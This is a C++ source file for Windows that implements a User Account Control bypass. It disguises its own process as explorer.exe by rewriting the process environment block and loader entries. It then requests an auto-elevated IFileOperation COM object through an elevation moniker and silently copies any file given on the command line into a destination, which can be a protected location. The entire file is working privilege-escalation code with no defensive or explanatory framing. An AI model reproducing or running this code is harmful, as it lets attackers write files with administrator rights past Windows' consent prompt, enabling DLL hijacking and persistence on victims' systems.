#include <windows.h>
#include <iostream>
#include <Shobjidl.h>
#include <wchar.h>
#include "ntos.h"

#define T_CLSID_FileOperation L"{3AD05575-8857-4850-9277-11B85BDB8E09}"
static LPWSTR g_lpszExplorer = NULL;

HRESULT elevateObject(void** fileOp)
{
	HRESULT     r = E_FAIL;
	BIND_OPTS3  bop;
	WCHAR       szElevationMoniker[MAX_PATH];
	DWORD dwClassContext = CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER;

	RtlSecureZeroMemory(szElevationMoniker, sizeof(szElevationMoniker));

	wcscpy(szElevationMoniker, L"Elevation:Administrator!new:");
	wcscat(szElevationMoniker, T_CLSID_FileOperation);
	

	RtlSecureZeroMemory(&bop, sizeof(bop));
	bop.cbStruct = sizeof(bop);
	bop.dwClassContext = dwClassContext;

	return CoGetObject(szElevationMoniker, (BIND_OPTS *)&bop, IID_IFileOperation, fileOp);
}

VOID NTAPI supxLdrEnumModulesCallback(_In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry, _In_ PVOID Context, _In_ OUT BOOLEAN *StopEnumeration)
{
	PPEB Peb = (PPEB)Context;

	if (DataTableEntry->DllBase == Peb->ImageBaseAddress) {
		RtlInitUnicodeString(&DataTableEntry->FullDllName, g_lpszExplorer);
		RtlInitUnicodeString(&DataTableEntry->BaseDllName, L"explorer.exe");
		*StopEnumeration = TRUE;
	}
	else {
		*StopEnumeration = FALSE;
	}
}

VOID elevateProcess()
{
	DWORD   cch;
	PPEB    Peb = NtCurrentPeb();
	SIZE_T  sz;
	WCHAR   szBuffer[MAX_PATH * 2];

	RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
	cch = GetWindowsDirectory(szBuffer, MAX_PATH);
	if ((cch != 0) && (cch < MAX_PATH)) {

		wcscat(szBuffer, L"\\");
		wcscat(szBuffer, L"explorer.exe");

		g_lpszExplorer = NULL;
		sz = 0x1000;
		NtAllocateVirtualMemory(NtCurrentProcess(), (void **)&g_lpszExplorer, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (g_lpszExplorer) {
			wcscpy(g_lpszExplorer, szBuffer);

			RtlEnterCriticalSection(Peb->FastPebLock);

			RtlInitUnicodeString(&Peb->ProcessParameters->ImagePathName, g_lpszExplorer);
			RtlInitUnicodeString(&Peb->ProcessParameters->CommandLine, L"CustomString");

			RtlLeaveCriticalSection(Peb->FastPebLock);

			LdrEnumerateLoadedModules(0, &supxLdrEnumModulesCallback, (PVOID)Peb);
		}
	}
}

int wmain(int argc, wchar_t* argv[], wchar_t *envp[])
{
	
	//Check Argument Count

	if (argc != 3) //Because the first arg is always the program name
	{
		std::cout << "Argument count mismatch!" << std::endl;
		return 1;
	}

	//Elevate Process

	elevateProcess();

	//Define Vars

	LPWSTR sourceFile;
	LPWSTR destinationFile;
	IFileOperation *fileOperation;
	IShellItem *src, *dst;
	HRESULT result;
	DWORD OperationFlags;

	//Init vars

	result = E_FAIL;
	src = NULL;
	dst = NULL;
	fileOperation = NULL;
	OperationFlags = FOF_NOCONFIRMATION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION;
	sourceFile = argv[1];
	destinationFile = argv[2];

	//Copy Operation
	result = CoInitialize(NULL);
	if (result != S_OK) return 1;
	std::cout << "COM Init Completed" << std::endl;
	result = CoCreateInstance(CLSID_FileOperation, NULL, CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER, IID_IFileOperation, (void **)&fileOperation);
	if (result != S_OK) return 1;
	std::cout << "Created COM Object" << std::endl;
	if (fileOperation != NULL) fileOperation->Release();
	std::cout << "FileOp Released" << std::endl;
	result = elevateObject((void **)&fileOperation);
	if (result != S_OK || fileOperation == NULL) return 1;
	std::cout << "COM Object Elevated" << std::endl;
	fileOperation->SetOperationFlags(OperationFlags);
	std::cout << "Operation flags set" << std::endl;
	result = SHCreateItemFromParsingName(sourceFile, NULL, IID_IShellItem, (void **)&src);
	if (result != S_OK) return 1;
	std::cout << "Source shell item created" << std::endl;
	result = SHCreateItemFromParsingName(destinationFile, NULL, IID_IShellItem, (void **)&dst);
	if (result != S_OK) return 1;
	std::cout << "Destination shell item created" << std::endl;
	result = fileOperation->CopyItem(src, dst, NULL, NULL);
	if (result != S_OK) return 1;
	std::cout << "Copy operation scheduled" << std::endl;
	result = fileOperation->PerformOperations();
	if (result != S_OK) return 1;
	std::cout << "All operations performed" << std::endl;
	src->Release();
	dst->Release();
	src = NULL;
	dst = NULL;
	fileOperation->Release();
	fileOperation = NULL;

	std::cout << "FileOp and Shell items released" << std::endl;
	//system("PAUSE"); Debugging purposes only

	return 0;
}